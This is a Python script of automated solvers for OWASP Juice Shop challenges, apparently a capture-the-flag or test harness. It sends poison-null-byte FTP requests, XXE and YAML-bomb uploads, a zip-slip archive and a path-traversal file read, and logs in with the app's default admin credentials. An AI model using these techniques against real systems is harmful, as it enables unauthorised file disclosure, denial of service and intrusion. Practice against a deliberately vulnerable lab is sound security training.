#!/usr/bin/env python3
"""File-access & file-upload challenges: FTP poison-null-byte, hidden URLs,
XXE / YAML-bomb / zip-slip uploads, local file read."""
from __future__ import annotations

import datetime
import os

from core import register_solver, Client, ok, warn, fail

PAYLOADS = os.path.join(os.path.dirname(__file__), "payloads")


def _payload(name: str) -> bytes:
    with open(os.path.join(PAYLOADS, name), "rb") as f:
        return f.read()


# ---- FTP poison null byte (%2500 -> %00) ---------------------------------- #
_FTP = {
    "forgottenBackupChallenge":       ("Sensitive Data Exposure", "/ftp/coupons_2013.md.bak%2500.md"),
    "forgottenDevBackupChallenge":    ("Sensitive Data Exposure", "/ftp/package.json.bak%2500.md"),
    "easterEggLevelOneChallenge":     ("Broken Access Control", "/ftp/eastere.gg%2500.md"),
    "misplacedSignatureFileChallenge": ("Observability Failures", "/ftp/suspicious_errors.yml%2500.md"),
    "nullByteChallenge":              ("Improper Input Validation", "/ftp/encrypt.pyc%2500.md"),
}


def _make_ftp(path):
    def solver(c: Client):
        # send the raw path so %2500 reaches the server intact
        r = c.s.get(c.base + path, timeout=30, verify=False, headers=c._auth_headers())
        ok(f"accessed {path} ({r.status_code})")
    return solver


for _k, (_cat, _p) in _FTP.items():
    register_solver(_k, f"Null-byte access {_p.split('/')[-1]}", _cat)(_make_ftp(_p))


# ---- directly-accessible hidden URLs -------------------------------------- #
_DIRECT = {
    "easterEggLevelTwoChallenge": ("Cryptographic Issues",
        "/the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg"),
    "premiumPaywallChallenge": ("Cryptographic Issues",
        "/this/page/is/hidden/behind/an/incredibly/high/paywall/that/could/only/be/unlocked/by/sending/1btc/to/us"),
    "privacyPolicyProofChallenge": ("Security through Obscurity",
        "/we/may/also/instruct/you/to/refuse/all/reasonably/necessary/responsibility"),
    "extraLanguageChallenge": ("Broken Anti Automation", "/assets/i18n/tlh_AA.json"),
    "missingEncodingChallenge": ("Improper Input Validation",
        "/assets/public/images/uploads/%E1%93%9A%E1%98%8F%E1%97%A2-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg"),
}


def _make_direct(path):
    def solver(c: Client):
        r = c.s.get(c.base + path, timeout=30, verify=False)
        ok(f"accessed {path[:60]}... ({r.status_code})")
    return solver


for _k, (_cat, _p) in _DIRECT.items():
    register_solver(_k, f"Access {_p.split('/')[-1][:24]}", _cat)(_make_direct(_p))


@register_solver("accessLogDisclosureChallenge", "Access today's access log", "Observability Failures")
def access_log(c: Client):
    today = datetime.date.today().isoformat()
    r = c.get(f"/support/logs/access.log.{today}")
    ok(f"read access.log.{today} ({r.status_code})") if r.ok \
        else warn(f"access log for {today} returned {r.status_code}")


# ---- file-upload driven challenges ---------------------------------------- #
def _upload(c: Client, filename, content, content_type):
    c.login("admin@juice-sh.op", "admin123")
    return c.post("/file-upload", files={"file": (filename, content, content_type)},
                  data={"UserId": "1"})


@register_solver("deprecatedInterfaceChallenge", "Upload XML (deprecated interface)", "Security Misconfiguration")
def deprecated_interface(c: Client):
    r = _upload(c, "deprecatedTypeForServer.xml", _payload("deprecatedTypeForServer.xml"), "application/xml")
    ok(f"uploaded XML complaint ({r.status_code})")


@register_solver("xxeFileDisclosureChallenge", "XXE file disclosure (/etc/passwd)", "XXE")
def xxe_disclosure(c: Client):
    r = _upload(c, "xxeForLinux.xml", _payload("xxeForLinux.xml"), "application/xml")
    ok(f"uploaded XXE payload ({r.status_code})")


@register_solver("xxeDosChallenge", "XXE DoS (/dev/random)", "XXE")
def xxe_dos(c: Client):
    r = _upload(c, "xxeDevRandom.xml", _payload("xxeDevRandom.xml"), "application/xml")
    ok(f"uploaded XXE DoS payload ({r.status_code})")


@register_solver("yamlBombChallenge", "YAML bomb (billion laughs)", "Insecure Deserialization")
def yaml_bomb(c: Client):
    r = _upload(c, "yamlBomb.yml", _payload("yamlBomb.yml"), "application/x-yaml")
    ok(f"uploaded YAML bomb ({r.status_code})")


@register_solver("fileWriteChallenge", "Arbitrary file write (zip slip)", "Vulnerable Components")
def file_write(c: Client):
    r = _upload(c, "arbitraryFileWrite.zip", _payload("arbitraryFileWrite.zip"), "application/zip")
    ok(f"uploaded zip-slip archive ({r.status_code})")


@register_solver("lfrChallenge", "Local file read via layout param", "Vulnerable Components")
def lfr(c: Client):
    c.login("admin@juice-sh.op", "admin123")
    r = c.post("/dataerasure", data="layout=../package.json",
               headers={"Content-Type": "application/x-www-form-urlencoded"})
    ok(f"local file read via layout traversal ({r.status_code})")
